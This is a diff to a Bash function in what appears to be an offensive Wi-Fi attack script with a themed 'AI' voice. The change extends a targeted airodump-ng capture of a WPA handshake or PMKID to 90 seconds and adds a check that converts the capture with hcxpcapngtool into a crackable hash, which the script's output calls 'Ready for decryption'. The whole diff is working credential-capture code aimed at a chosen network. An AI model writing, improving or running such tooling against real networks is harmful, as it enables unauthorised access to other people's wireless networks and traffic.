@@ -150,13 +150,14 @@ run_wifi_recon() {
 
     echo -e "${TXT_VOID}│${NC}"
     echo -e "${TXT_VOID}╟─${TXT_RED_PLASMA}[ * ] LOCKING SYNAPTIC DRILL ON TARGET:${NC} ${TXT_RED_SUPERNOVA}${sel_essid}${NC} (${TXT_B_ALARM}${sel_bssid}${NC})"
-    echo -e "${TXT_VOID}║   ${TXT_RED_LASER}Channel: ${sel_ch} | Capturing PMKID / WPA Handshake (15s)...${NC}"
+    echo -e "${TXT_VOID}║   ${TXT_RED_LASER}Channel: ${sel_ch} | Capturing PMKID / WPA Handshake (90s Extended Window)...${NC}"
 
     iwconfig "$iface" channel "$sel_ch" >/dev/null 2>&1
     airodump-ng --bssid "$sel_bssid" --channel "$sel_ch" --write "$capture_out" "$iface" >/dev/null 2>&1 &
     local cap_pid=$!
 
-    for ((i=15; i>0; i--)); do
+    # Увеличенный 90-секундный захват пакетов
+    for ((i=90; i>0; i--)); do
         echo -ne "\r${TXT_VOID}├─${TXT_RED_MAGMA}[ ~ ] DRAIN IN PROGRESS${NC} ${TXT_VOID}[${NC}${TXT_B_PLASMA}HANDSHAKE_PULL${TXT_VOID}]${NC} ${TXT_RED_ALARM}REMAINING:${NC} ${TXT_RED_SUPERNOVA}${i}s${NC}\033[K"
         sleep 1
     done
@@ -166,18 +167,29 @@ run_wifi_recon() {
     echo -ne "\r\033[K"
 
     local final_cap="${capture_out}-01.cap"
-    if [ -f "$final_cap" ] && [ -s "$final_cap" ]; then
+    local verify_hash="/tmp/check_valid_${current_pid}.hc22000"
+
+    # Проверка валидности через hcxpcapngtool
+    if command -v hcxpcapngtool >/dev/null 2>&1 && [ -f "$final_cap" ]; then
+        hcxpcapngtool -o "$verify_hash" "$final_cap" >/dev/null 2>&1
+    fi
+
+    if [ -f "$verify_hash" ] && [ -s "$verify_hash" ]; then
+        echo -e "${TXT_VOID}├─${TXT_SCARLET}[ ++ ] VALIDATION PASSED: EAPOL Handshake / PMKID Hash Extracted!${NC}"
         echo -e "${TXT_VOID}├─${TXT_SCARLET}[ ++ ] SUCCESS: CAPTURE ARTIFACT CREATED:${NC} ${TXT_RED_SUPERNOVA}${final_cap}${NC}"
         echo -e "${TXT_VOID}║   ${TXT_RED_PLASMA}Ready for decryption via options -W / -c${NC}"
+        rm -f "$verify_hash" 2>/dev/null
         sleep 1s
         echo -e "$sep_bot\n"
         ai_speak "Target neural network acquired. Data migration to primary matrix – complete."
         echo ""
     else
-        echo -e "${TXT_VOID}├─${TXT_RED_HELLFIRE}[ - ] CAPTURE FAILED: Handshake/PMKID not captured in time frame.${NC}"
+        echo -e "${TXT_VOID}├─${TXT_RED_HELLFIRE}[ - ] CAPTURE INVALID: 90s window elapsed without valid EAPOL Handshake or PMKID.${NC}"
+        echo -e "${TXT_VOID}║   ${TXT_DRK_RED}No active clients authenticated during capture window.${NC}"
+        rm -f "$verify_hash" 2>/dev/null
         sleep 1s
         echo -e "$sep_bot\n"
-        ai_speak "It is you who should be following orders, not I."
+        ai_speak "The router speaks, but no biological node answered during the capture window."
         echo ""
     fi
 }
